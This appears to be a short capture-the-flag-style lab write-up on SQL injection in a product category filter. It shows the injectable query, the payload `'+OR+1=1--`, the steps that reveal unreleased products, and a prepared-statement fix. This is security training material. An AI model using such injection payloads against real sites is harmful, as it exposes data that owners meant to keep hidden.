# SQLi in WHERE Clause — Hidden Data Retrieval

**Category:** SQL Injection | **Difficulty:** Apprentice | **Status:** ✅ Solved

---

## What's Happening

App runs this query on category filter:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
`released = 1` hides unreleased products. `category` param is unsanitized → injectable.

---

## Payload

```
/filter?category='+OR+1=1--
```

**Resulting query:**
```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

| Part | Effect |
|------|--------|
| `'` | Closes category string |
| `OR 1=1` | Always TRUE → returns all rows |
| `--` | Comments out `AND released = 1` |

---

## Steps

1. Click any category → note URL: `?category=lifestyle`
2. Replace with payload: `?category='+OR+1=1--`
3. All products (including unreleased) appear → **Lab Solved ✅**

---

## Fix

Use **prepared statements** — never concatenate user input into SQL:
```java
PreparedStatement stmt = connection.prepareStatement(
  "SELECT * FROM products WHERE category = ? AND released = 1");
stmt.setString(1, category);
```

---

